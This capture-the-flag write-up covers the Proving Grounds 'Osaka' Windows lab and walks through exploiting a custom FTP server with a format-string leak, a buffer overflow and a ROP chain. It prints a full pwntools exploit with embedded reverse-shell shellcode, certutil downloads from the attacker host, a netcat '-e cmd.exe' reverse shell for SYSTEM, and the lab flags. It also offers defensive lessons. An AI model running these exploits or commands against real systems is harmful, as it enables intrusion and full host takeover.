# 🪟 Osaka — Proving Grounds Practice Writeup

> **Platform:** Offensive Security Proving Grounds Practice  
> **Difficulty:** Hard  
> **OS:** Windows  
> **Author:** [Tanvir Ahmed](https://github.com/Tanvir-2) | [Portfolio](https://tanvirkarim.it)  
> **Status:** ✅ Completed  
> **Tags:** `FTP` `Binary Exploitation` `Format String` `ASLR Bypass` `Buffer Overflow` `DEP Bypass` `ROP Chain` `SeDebugPrivilege` `Windows Privilege Escalation`

---

## 📋 Table of Contents

1. [Lab Overview](#lab-overview)
2. [Reconnaissance](#reconnaissance)
3. [FTP Enumeration](#ftp-enumeration)
4. [Binary Analysis](#binary-analysis)
5. [Exploitation — Part 1: Format String / ASLR Bypass](#exploitation--part-1-format-string--aslr-bypass)
6. [Exploitation — Part 2: Buffer Overflow (RETR Command)](#exploitation--part-2-buffer-overflow-retr-command)
7. [Exploitation — Part 3: ROP Chain / DEP Bypass](#exploitation--part-3-rop-chain--dep-bypass)
8. [Initial Access](#initial-access)
9. [Privilege Escalation — SeDebugPrivilege Abuse](#privilege-escalation--sedebugprivilege-abuse)
10. [Flags](#flags)
11. [Attack Chain](#-attack-chain)
12. [Skills Demonstrated](#-skills-demonstrated)
13. [Lessons Learned](#-lessons-learned)
14. [References](#references)
15. [Tools Used](#tools-used)

---

## 🏛️ Lab Overview

| Field | Details |
|-------|---------|
| **Target IP** | `192.168.164.20` |
| **Hostname** | `OSAKA` |
| **OS** | Windows Server 2019 (Build 10.0.17763) |
| **Difficulty** | Hard |
| **Focus Areas** | Binary exploitation, ROP chain construction, Windows privilege escalation |

**Lab Summary:**  
Osaka is a hard-rated Windows box centered on binary exploitation of a custom FTP server. The attack chain requires downloading and reverse-engineering the FTP server binary, exploiting a format string vulnerability to defeat ASLR, then chaining a stack buffer overflow with a ROP (Return Oriented Programming) chain to bypass DEP and achieve remote code execution. Privilege escalation leverages `SeDebugPrivilege` to spawn a shell as a child process of `winlogon.exe`, yielding SYSTEM access.

---

## 🔍 Reconnaissance

### Port Scan

```bash
nmap -sC -sV -sS -A -T5 -p- -Pn 192.168.164.20
```

<img width="1058" height="760" alt="image" src="https://github.com/user-attachments/assets/c18d8c04-29fc-4993-9401-1423b9eb39b0" />
<img width="1675" height="613" alt="image" src="https://github.com/user-attachments/assets/4b34a48b-11eb-4e34-9479-1692ee5406dc" />
<img width="1320" height="446" alt="image" src="https://github.com/user-attachments/assets/c4732ad2-dc8f-46ec-881f-13afa68bbf84" />


### Results

| Port | State | Service | Version/Details |
|------|-------|---------|-----------------|
| 21/tcp | open | ftp | **Simple FTP Server** (custom binary) |
| 135/tcp | open | msrpc | Microsoft Windows RPC |
| 139/tcp | open | netbios-ssn | Microsoft Windows netbios-ssn |
| 445/tcp | open | microsoft-ds | SMB |
| 3389/tcp | open | ms-wbt-server | Microsoft Terminal Services (RDP) |
| 5985/tcp | open | http | Microsoft HTTPAPI 2.0 (WinRM) |
| 47001/tcp | open | http | Microsoft HTTPAPI 2.0 |
| 49664-49670/tcp | open | msrpc | Microsoft Windows RPC |

**Key Findings:**
- Port 21 is running **"Simple FTP Server"** — a non-standard, custom-built binary, immediately suspicious
- RDP and WinRM are open for potential post-exploitation lateral movement
- Windows Server 2019 (Build 17763), hostname: `OSAKA`
- SMB message signing enabled but **not required** (potential relay vector)

---

## 📂 FTP Enumeration

### Anonymous FTP Login

```bash
ftp 192.168.164.20
# Name: anonymous
# Password: (blank)
```

<img width="951" height="662" alt="image" src="https://github.com/user-attachments/assets/c357dedb-43ab-45c4-a7ad-97e6bb552e2e" />


Anonymous authentication succeeded. The FTP server was locked to the `C:\dev` directory, which contained two files:

```
05/11/2023  12:25 PM            29 dev.txt
05/11/2023  12:16 PM       158,208 ftp.exe
```

### Download Both Files

```bash
ftp> get dev.txt
ftp> get ftp.exe
```

<img width="876" height="427" alt="image" src="https://github.com/user-attachments/assets/054b7854-de5e-4d9b-b640-f72415b64af2" />


**`dev.txt` contents:**
```
This is a development server.
```

> **⚠️ Critical Finding:** `ftp.exe` is the **actual FTP server binary** itself (158,208 bytes). Downloading it allows full local analysis and reverse engineering without network noise — a rare and powerful enumeration advantage.

---

## 🔬 Binary Analysis

### Static Analysis with `strings`

```bash
strings ftp.exe
```

<img width="689" height="255" alt="image" src="https://github.com/user-attachments/assets/aacdfb56-98bb-49ff-92ed-87f1d5235c43" />


**Sections identified:**
```
.text
.rdata
.data
.reloc
```

**Commands of interest discovered:**
- `DEBUG` — non-standard command; passes user input to a printf-style function **without sanitization** → **Format String vulnerability**
- `RETR` — standard FTP retrieve command; vulnerable to **stack-based buffer overflow**

**Vulnerability Summary:**

| Vulnerability | Trigger | Impact |
|--------------|---------|--------|
| Format String | `DEBUG %x|%x|...` | Stack memory leak → ASLR bypass |
| Stack Buffer Overflow | `RETR` + 272+ bytes | EIP control → arbitrary code execution |
| DEP enabled | — | Blocks direct shellcode on stack |
| ASLR enabled | — | Randomises binary/ROP gadget addresses |

---

## 💥 Exploitation — Part 1: Format String / ASLR Bypass

The `DEBUG` command passes user-supplied format strings directly to a `printf`-style call. Injecting `%x` specifiers causes the server to leak stack memory values over the wire.

### Format String Payload

```python
p.sendline(b"DEBUG " + b"%x|" * 100)
leak = p.recvlines(numlines=2)[-1][6:]
leak = leak.split(b"|")
leak_pie = int(leak[0], 16)
```

<img width="689" height="255" alt="image" src="https://github.com/user-attachments/assets/00a8317f-c661-4ebf-9d15-a868980b9ee0" />


- The **first leaked value** is an address inside the binary itself
- Subtracting the known static offset `0x10f0` gives the **runtime binary base address**

```python
bin_base = leak_pie - 0x10f0
print(f"Binary Base: {hex(bin_base)}")
```

> **Result:** ASLR is defeated. All ROP gadget addresses can now be calculated at runtime by adding their static offsets to `bin_base`.

---

## 💥 Exploitation — Part 2: Buffer Overflow (RETR Command)

The `RETR` command is vulnerable to a classic stack-based buffer overflow. Sending more than **272 bytes** overwrites the saved return address (EIP), granting full control over execution flow.

```python
buf  = b"A" * (268 + 4)   # 272 bytes total to reach saved EIP
buf += rop_chain
buf += b"\x90" * 10        # NOP sled
buf += shellcode
buf += b"B" * (1000 - len(buf))  # padding to fill buffer
```

**DEP is active** — writing shellcode directly onto the stack will not execute. A ROP chain is required.

---

## 💥 Exploitation — Part 3: ROP Chain / DEP Bypass

### Strategy: VirtualAlloc → Executable Memory → JMP ESP

DEP (Data Execution Prevention) marks the stack as non-executable. To bypass it, a **Return Oriented Programming (ROP)** chain calls `VirtualAlloc()` to allocate a new memory region with `PAGE_EXECUTE_READWRITE` (protection flag `0x40`). Execution then redirects via `JMP ESP` into the newly executable region where shellcode resides.

All gadget addresses are resolved at runtime using `bin_base` calculated from the format string leak.

### ROP Gadget Chain

```python
rop_gadgets = [
    # Set up registers for VirtualAlloc()
    0xe145 + bin_base,   # POP EBP  # RETN
    0xe145 + bin_base,   # Skip 4 bytes (POP EBP placeholder)
    0x1d5a9 + bin_base,  # POP EBX  # RETN  → EBX = 1 (size)
    0x1,
    0x1bd7e + bin_base,  # POP EDX  # RETN  → EDX = 0x1000 (MEM_COMMIT)
    0x1000,
    0x11a2b + bin_base,  # POP ECX  # RETN  → ECX = 0x40 (PAGE_EXECUTE_READWRITE)
    0x40,
    0x4667 + bin_base,   # POP EDI  # RETN
    0x4682 + bin_base,   # RETN (ROP NOP)
    0x1dff + bin_base,   # POP ESI  # RETN
    0x14adb + bin_base,  # JMP [EAX]
    0x1d2bf + bin_base,  # POP EAX  # RETN  → EAX = &VirtualAlloc
    0x1e008 + bin_base,  # Pointer to VirtualAlloc()
    0x10d6 + bin_base,   # PUSHAD   # RETN  → call VirtualAlloc()
    0x10da + bin_base,   # JMP ESP  → redirect to shellcode
]
```

### Generate Shellcode

```bash
msfvenom -a x86 --platform windows \
  -p windows/shell_reverse_tcp \
  LHOST=192.168.45.157 LPORT=1337 \
  -f python -v sc
```

<img width="1449" height="501" alt="image" src="https://github.com/user-attachments/assets/37917abb-7847-4c72-93a5-68bf5d33233b" />


**Payload size:** 324 bytes — `windows/shell_reverse_tcp`

### Full Exploit — `exploit.py`

```python
from pwn import *

# msfvenom shellcode (windows/shell_reverse_tcp LHOST=192.168.45.157 LPORT=1337)
sc  = b""
sc += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
sc += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
sc += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
sc += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
sc += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
sc += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
sc += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
sc += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
sc += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
sc += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
sc += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
sc += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
sc += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
sc += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
sc += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
sc += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8"
sc += b"\x2d\x9d\x68\x02\x00\x05\x39\x89\xe6\x6a\x10\x56"
sc += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
sc += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
sc += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
sc += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
sc += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
sc += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
sc += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
sc += b"\x87\x1d\x60\xff\xd5\xbb\xcd\x64\x9f\x68\x68\xa6"
sc += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
sc += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"

# Connect & authenticate
p = remote('192.168.164.20', 21, level='debug')
p.recvuntil("220 Welcome to Simple FTP Server")
p.sendline("USER admin")
p.recvuntil("331 User OK, password required")
p.sendline("PASS admin")
p.recvuntil("230 Login successful")

# Stage 1: Format string leak → ASLR bypass
p.sendline(b"DEBUG " + b"%x|" * 100)
leak = p.recvlines(numlines=2)[-1][6:]
leak = leak.split(b"|")
leak_pie = int(leak[0], 16)

bin_base = leak_pie - 0x10f0
print(f"[*] Binary Base: {hex(bin_base)}")

# Stage 2: Build ROP chain (all offsets relative to bin_base)
rop_gadgets = [
    0xe145  + bin_base,   # POP EBP  # RETN
    0xe145  + bin_base,   # (skip)
    0x1d5a9 + bin_base,   # POP EBX  # RETN
    0x1,                  # size = 1
    0x1bd7e + bin_base,   # POP EDX  # RETN
    0x1000,               # MEM_COMMIT
    0x11a2b + bin_base,   # POP ECX  # RETN
    0x40,                 # PAGE_EXECUTE_READWRITE
    0x4667  + bin_base,   # POP EDI  # RETN
    0x4682  + bin_base,   # RETN (ROP NOP)
    0x1dff  + bin_base,   # POP ESI  # RETN
    0x14adb + bin_base,   # JMP [EAX]
    0x1d2bf + bin_base,   # POP EAX  # RETN
    0x1e008 + bin_base,   # ptr to VirtualAlloc()
    0x10d6  + bin_base,   # PUSHAD # RETN → call VirtualAlloc
    0x10da  + bin_base,   # JMP ESP → exec shellcode
]

rop = b""
for gadget in rop_gadgets:
    rop += p32(gadget)

# Stage 3: Overflow buffer and trigger ROP → shellcode
total = 1000
buf  = b"A" * (268 + 4)   # 272 bytes to saved EIP
buf += rop
buf += b"\x90" * 10        # NOP sled
buf += sc
buf += b"B" * (total - len(buf))

p.sendline(b"RETR " + buf + b"\r\n")
p.interactive()
```

### Start Listener

```bash
nc -lvnp 1337
```

### Execute Exploit

```bash
python3 exploit.py
```

<img width="883" height="238" alt="image" src="https://github.com/user-attachments/assets/9a61a55f-9e02-4b0c-ba24-660409d69ade" />


---

## 🚪 Initial Access

<img width="971" height="556" alt="image" src="https://github.com/user-attachments/assets/f343a539-3a71-4cf3-bd70-1c4405b84474" />


```
connect to [192.168.45.157] from (UNKNOWN) [192.168.164.20] 50200
Microsoft Windows [Version 10.0.17763.4252]
C:\dev>
```

Shell received as **Wilson** on `OSAKA`. Navigated to `C:\Users\Wilson\Desktop`:

```cmd
C:\Users\Wilson\Desktop> type local.txt
```

<img width="971" height="556" alt="image" src="https://github.com/user-attachments/assets/ae922e6f-2603-4e85-baa0-008c178b313a" />


```
448353a193a519cd417e851b7e10adee
```

---

## 🔺 Privilege Escalation — SeDebugPrivilege Abuse

### Check Current Privileges

```cmd
whoami /priv
```

<img width="1200" height="429" alt="image" src="https://github.com/user-attachments/assets/9e798389-0fe6-4318-8c1c-91ff34f0db3c" />


```
PRIVILEGES INFORMATION

Privilege Name                  Description                    State
=============================== ============================== ========
SeDebugPrivilege                Debug programs                 Enabled
SeLoadDriverPrivilege           Load and unload device drivers Disabled
SeChangeNotifyPrivilege         Bypass traverse checking       Enabled
```

> **🎯 Key Finding:** `SeDebugPrivilege` is **Enabled**. This privilege allows attaching a debugger to — and spawning child processes from — any running process, including high-privilege system processes like `winlogon.exe`.

### Stage Files via HTTP Server

On the attacker machine:
```bash
# Copy tools to web root
cp /opt/SeDebugPrivilegePoC.exe /var/www/html/
cp /usr/share/windows-binaries/nc.exe /var/www/html/

# Start HTTP server
python3 -m http.server 8000
```

### Download Tools to Target

```cmd
certutil -urlcache -split -f http://192.168.45.157:8000/SeDebugPrivilegePoC.exe SeDebugPrivilegePoC.exe
certutil -urlcache -split -f http://192.168.45.157:8000/nc.exe nc.exe
```

<img width="1514" height="794" alt="image" src="https://github.com/user-attachments/assets/c702caef-f788-47ee-b8f8-e5e516035b87" />
<img width="899" height="191" alt="image" src="https://github.com/user-attachments/assets/f961ce89-6f4e-4891-9001-3ea9d865b4a4" />


```
C:\Users\Wilson\Documents> dir
09/20/2026  08:20 PM        10,752 SeDebugPrivilegePoC.exe
09/20/2026  08:23 PM        38,616 nc.exe
```

### Start Second Listener

```bash
nc -lvnp 4444
```

### Abuse SeDebugPrivilege — Spawn Shell as winlogon.exe Child

```cmd
SeDebugPrivilegePoC.exe "C:\Users\Wilson\Documents\nc.exe 192.168.45.157 4444 -e C:\Windows\system32\cmd.exe"
```

<img width="1668" height="379" alt="image" src="https://github.com/user-attachments/assets/6d9e7ad2-6594-4062-9497-db7f42c136c3" />


```
[*] Modified by r4j3sh
[+] Executing command: C:\Users\Wilson\Documents\nc.exe 192.168.45.157 4444 -e C:\Windows\system32\cmd.exe
[+] This PoC tries to Execute the command as a winlogon.exe's child process
[>] Searching winlogon PID.
[+] PID of winlogon: 548
[>] Trying to get handle to winlogon
[+] New process PID: 2404 is created successfully
```

### SYSTEM Shell Received

<img width="711" height="156" alt="image" src="https://github.com/user-attachments/assets/0c248c1b-c006-4276-9d45-60f758fd283f" />


```
connect to [192.168.45.157] from (UNKNOWN) [192.168.164.20] 50146
Microsoft Windows [Version 10.0.17763.4252]
C:\Users\Wilson\Documents>
```

The new shell runs as a **child of `winlogon.exe`** — effectively SYSTEM-level.

---

## 🚩 Flags

```cmd
C:\Users\Administrator\Desktop> type proof.txt
```

<img width="821" height="807" alt="image" src="https://github.com/user-attachments/assets/d5a54bd5-d7ab-4e19-b168-6bdbaf62422d" />


| Flag | Location | Value |
|------|----------|-------|
| **local.txt** | `C:\Users\Wilson\Desktop\local.txt` | `448353a193a519cd417e851b7e10adee` |
| **proof.txt** | `C:\Users\Administrator\Desktop\proof.txt` | `0d1479045927709977a6512afb28e08` |

---

## 🗺️ Attack Chain

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        OSAKA — ATTACK CHAIN                             │
└─────────────────────────────────────────────────────────────────────────┘

[Attacker 192.168.45.157]
        │
        │ 1. Nmap scan → port 21 (Simple FTP Server — custom binary)
        ▼
[OSAKA:21 — Anonymous FTP]
        │
        │ 2. Anonymous login → C:\dev\
        │    └─ dev.txt ("development server")
        │    └─ ftp.exe  (158,208 bytes — the server binary itself!)
        ▼
[Local Binary Analysis]
        │
        │ 3. strings ftp.exe → DEBUG (format string) + RETR (overflow)
        │    Binary protections: ASLR ✅  DEP ✅  Stack Canary ❌
        ▼
[Exploit — Stage 1: ASLR Bypass]
        │
        │ 4. USER admin / PASS admin → authenticate
        │ 5. DEBUG %x|%x|... × 100 → stack memory leak
        │    leaked[0] = binary address → bin_base = leak - 0x10f0
        ▼
[Exploit — Stage 2: Buffer Overflow]
        │
        │ 6. RETR + 272 bytes → overwrite saved EIP
        ▼
[Exploit — Stage 3: ROP Chain (DEP Bypass)]
        │
        │ 7. ROP gadgets (all relative to bin_base):
        │       POP EBX → size=1
        │       POP EDX → MEM_COMMIT=0x1000
        │       POP ECX → PAGE_EXECUTE_READWRITE=0x40
        │       POP EAX → &VirtualAlloc()
        │       PUSHAD  → call VirtualAlloc()
        │       JMP ESP → jump to shellcode
        │ 8. msfvenom windows/shell_reverse_tcp → LHOST:1337
        ▼
[Initial Shell: OSAKA\Wilson @ C:\dev]
        │
        │ 9. type local.txt → 448353a193a519cd417e851b7e10adee
        │ 10. whoami /priv → SeDebugPrivilege: Enabled ⭐
        ▼
[Privilege Escalation: SeDebugPrivilege]
        │
        │ 11. certutil → download SeDebugPrivilegePoC.exe + nc.exe
        │ 12. SeDebugPrivilegePoC.exe "nc.exe 192.168.45.157 4444 -e cmd.exe"
        │     → Spawns cmd.exe as child of winlogon.exe (PID 548)
        ▼
[SYSTEM Shell — winlogon.exe child process]
        │
        │ 13. Navigate to C:\Users\Administrator\Desktop\
        │     type proof.txt → 0d1479045927709977a6512afb28e08
        ▼
[🏆 PWNED]
```

---

## 🛡️ Skills Demonstrated

| # | Skill | MITRE ATT&CK Technique | TTP ID |
|---|-------|------------------------|--------|
| 1 | Port scanning & service fingerprinting | Network Service Discovery | T1046 |
| 2 | FTP enumeration — anonymous access | Exploit Public-Facing Application | T1190 |
| 3 | Binary exfiltration via FTP | Ingress Tool Transfer | T1105 |
| 4 | Static binary analysis (`strings`) | Software Discovery | T1518 |
| 5 | Format string vulnerability exploitation | Exploitation for Client Execution | T1203 |
| 6 | Memory leak — ASLR bypass via info leak | Exploitation for Privilege Escalation | T1068 |
| 7 | Stack-based buffer overflow — EIP control | Exploitation for Client Execution | T1203 |
| 8 | ROP chain construction — DEP bypass | Hijack Execution Flow | T1574 |
| 9 | VirtualAlloc() abuse for executable memory | Process Injection | T1055 |
| 10 | msfvenom shellcode generation | Command and Scripting Interpreter | T1059 |
| 11 | pwntools exploit scripting (Python) | Scripting | T1059.006 |
| 12 | Privilege enumeration (`whoami /priv`) | System Information Discovery | T1082 |
| 13 | SeDebugPrivilege abuse | Access Token Manipulation | T1134 |
| 14 | Certutil for file download (LOLBAS) | Ingress Tool Transfer | T1105 |
| 15 | winlogon.exe child process injection | Create or Modify System Process | T1543 |

---

## 📚 Lessons Learned

### 🔴 Offensive Perspective

1. **Exposed binaries are attack surfaces.** Anonymous FTP exposing the server binary itself is a catastrophic misconfiguration. Always download and analyze binaries served over unauthenticated services — they often reveal hidden commands and vulnerability classes.

2. **Multi-stage exploitation requires methodical building blocks.** Format string → ASLR bypass → buffer overflow → ROP chain → shellcode is a chain where each stage enables the next. Break it into discrete, testable steps using tools like `pwntools`. Never attempt to build the full chain blindly.

3. **ROP gadget reuse is powerful and stealthy.** Using code already in the binary means no additional code injection — only redirection. The entire DEP bypass executes within the binary's own `.text` section. This evades many endpoint detection signatures that look for injected shellcode patterns.

4. **SeDebugPrivilege is a silent SYSTEM escalator.** It rarely shows up in tool-assisted privesc scans (WinPEAS focuses more on service misconfigs, registry keys, etc.). Always enumerate `whoami /priv` manually and cross-reference privileges against known PoCs. `SeDebugPrivilege` enabled on a standard user = game over.

5. **LOLBAS is always available.** `certutil -urlcache -split -f` for file download is a Windows built-in that bypasses application whitelisting on most systems and rarely triggers AV without additional evasion.

---

### 🔵 Defensive Perspective

1. **Never expose custom binaries over anonymous FTP.** If FTP is required, enforce authentication, restrict directory scope, and use read-only access for specific trusted IPs. Exposing the server executable itself gives attackers the exact binary to reverse-engineer locally without network detection.

2. **Implement safe string-handling in all network-facing code.** Format string vulnerabilities (`printf(user_input)`) are eliminated by always passing a format string literal: `printf("%s", user_input)`. This is a decades-old vulnerability class with no excuse in modern code.

3. **Instrument with stack canaries, safe SEH, and CFG.** Compile all network-facing binaries with `/GS` (stack cookies), `/SafeSEH`, and `/guard:cf` (Control Flow Guard) in MSVC. These mitigations significantly raise the bar for successful exploitation even when overflow vulnerabilities exist.

4. **Apply Principle of Least Privilege rigorously.** Service accounts and developer accounts should have minimal token privileges. `SeDebugPrivilege` should be restricted to domain administrators only via Group Policy (`Computer Configuration → Windows Settings → Security Settings → Local Policies → User Rights Assignment → Debug programs`).

5. **Monitor for `certutil` network activity.** `certutil -urlcache` making outbound HTTP calls to non-Microsoft domains is a well-known LOLBin indicator. Endpoint detection rules and network-level egress filtering (especially from service accounts) should flag this.

---

### 🟡 Key Takeaways

- **Custom protocols are rarely audited** — if you see a non-standard FTP banner, prioritize binary analysis before web enumeration.
- **ASLR is not sufficient alone** — format string leaks trivially defeat it. ASLR's value comes from being combined with CFG, PIE, and hardened parsing of user inputs.
- **`SeDebugPrivilege` abuse is OPSEC-friendly** — spawning a child process of `winlogon.exe` appears legitimate in process trees and does not require writing files to disk beyond the PoC binary itself.
- **Exploit development is a core red team skill** — tools like Metasploit won't create custom ROP chains for bespoke binaries. Python + pwntools + manual gadget finding is the path for hard labs and real engagements.

---

## 📎 References

| Resource | URL |
|----------|-----|
| SeDebugPrivilegePoC (r4j3sh-com) | https://github.com/r4j3sh-com/SeDebugPrivilegePoC |
| pwntools Documentation | https://docs.pwntools.com/en/stable/ |
| MITRE ATT&CK — Access Token Manipulation | https://attack.mitre.org/techniques/T1134/ |
| MITRE ATT&CK — Hijack Execution Flow | https://attack.mitre.org/techniques/T1574/ |
| MITRE ATT&CK — Process Injection | https://attack.mitre.org/techniques/T1055/ |
| Corelan — ROP Tutorial | https://www.corelan.be/index.php/2010/06/16/exploit-writing-tutorial-part-10-chaining-dep-with-rop-the-rubik%e2%80%99s-cube/ |
| VirtualAlloc — Microsoft Docs | https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc |
| LOLBAS — certutil | https://lolbas-project.github.io/lolbas/Binaries/Certutil/ |
| Offensive Security Proving Grounds | https://www.offsec.com/labs/individual/ |

---

## 🧰 Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Port scanning and service fingerprinting |
| `ftp` (CLI) | Anonymous FTP enumeration and binary download |
| `strings` | Static binary analysis — command enumeration |
| `python3` + `pwntools` | Exploit scripting (format string leak, buffer overflow, ROP chain) |
| `msfvenom` | Windows reverse shell shellcode generation |
| `nc` (netcat) | Reverse shell listeners |
| `certutil` (LOLBAS) | File transfer to target (SeDebugPrivilegePoC.exe, nc.exe) |
| `SeDebugPrivilegePoC.exe` | SeDebugPrivilege abuse → winlogon.exe child process |
| Python HTTP Server | Hosting payload files for certutil download |

---

<div align="center">

**[⬅ Back to Portfolio](https://github.com/Tanvir-2) | [🌐 tanvirkarim.it](https://tanvirkarim.it)**

*Osaka — Proving Grounds Practice | Hard | Windows Binary Exploitation*

</div>
